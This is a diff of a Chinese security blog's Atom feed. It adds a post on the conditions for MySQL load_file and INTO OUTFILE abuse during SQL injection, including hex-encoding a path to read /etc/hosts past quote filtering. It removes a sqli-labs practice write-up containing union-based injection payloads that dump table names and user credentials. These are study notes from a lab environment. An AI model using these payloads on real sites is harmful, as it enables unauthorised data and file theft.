@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-10-31T15:43:51.583Z</updated>
+  <updated>2021-12-01T12:06:44.848Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,23 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>load_file</title>
+    <link href="http://example.com/2021/12/01/load-file/"/>
+    <id>http://example.com/2021/12/01/load-file/</id>
+    <published>2021-12-01T12:02:56.000Z</published>
+    <updated>2021-12-01T12:06:44.848Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.load_file的文件大小必须小于max_allowed_packet<br>2.文件具有可执行权限：chmod a+x 文件路径/文件名<br>(有时候没法读取，可以先把内容out file出来，然后下载，但测试只能在数据库中执行)</p><span id="more"></span><hr><p>使用into oufile 的五个条件</p><h1>1.</h1>要有secure_file_priv参数这个参数用来限制数据导入和导出操作的效果，例如执行load data、select … into outfile语句和load_file()函数。这些操作需要用户具有FILE权限当secure_file_priv为NULL，表示对MySQL限制进行导入与导出当secure_file_priv的值为/tmp/ ，表示限制MySQL的导入与导出只能发生在/tmp/目录下当secure_file_priv没有指定具体值时，则不对导入与导出进行任何限制<h1>2.</h1>要知道绝对路径，这样into outfile ‘文件路径/文件名’ 才能写在正确的目录下<h1>3.</h1>目标没有对单引号(’)进行过滤outfile后的文件路径不能用十六进制或配合char()来实现，只能用引号这种形式因为包含路径的引号不能用其他函数代替如果被过滤，可以使用hex编码进行逃逸注：PHP中hex编码后可以直接加进去。如：load_file(/etc/hosts) 可以直接 load_file(0x2f6574632f686f737473)<h1>4.</h1>能够使用union,需要MySQL1.3以上版本<h1>5.</h1>对WEB的目录具有读权限判断是否具有读权限and (select count(*) from mysql.user)>0 ##如果结果返回正常，说明具有读写权限and (select count(*) from mysql.user)>0 ##返回错误，应该是管理员给数据库账户降权了]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;1.load_file的文件大小必须小于max_allowed_packet&lt;br&gt;2.文件具有可执行权限：chmod a+x 文件路径/文件名&lt;br&gt;(有时候没法读取，可以先把内容out file出来，然后下载，但测试只能在数据库中执行)&lt;/p&gt;</summary>
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>sqlmap</title>
@@ -44,23 +61,6 @@
     
     
     <summary type="html">&lt;p&gt;用到截取字符串的问题，不回显的情况下进行的注入（盲注） 要截取字符串。&lt;br&gt;用到的三个函数mid(),substr(),left()&lt;/p&gt;</summary>
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>labs-sqli 1-5</title>
-    <link href="http://example.com/2021/10/21/labs-sqli-1-5/"/>
-    <id>http://example.com/2021/10/21/labs-sqli-1-5/</id>
-    <published>2021-10-21T15:38:14.000Z</published>
-    <updated>2021-10-21T15:45:19.254Z</updated>
-    
-    <content type="html"><![CDATA[<p>labs-sqli 1-5题小结（虽然感觉还没大懂）</p><span id="more"></span><hr><h1>大体做题流程都是：</h1><br>先判断是字符型还是数字型<br><br>?id=1 <br><br>/*只有输入错误的类型报错我们才知道注入是哪种*/<br><br>确认字段位数<br><br>?id=1 order by 3<br><br>确认占位信息<br><br>/*使用基于报错的union联合查询,所以我们把id=1改成-1（一个正常来说肯定不存在的值）那它就能回显出我们要爆的东西*/<br><br>?id=-1 union select 1,2,3--+<br><br>找库名<br><br>?id=-1 union select 1,2,database() --+<br><br>找表名<br><br>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+<br><br>/*group_concat()函数将组中的字符串连接成为字符串(就可以一次多爆出点我们需要的东西)<br><br>找字段名<br><br>?id=-1 union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema='security' and table_name='users'--+<br><br>找账号密码信息<br><br>?id=-1 union select 1,2,group_concat(concat_ws(',',username,password) SEPARATOR '|') from users --+<br>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;labs-sqli 1-5题小结（虽然感觉还没大懂）&lt;/p&gt;</summary>
     
     
     
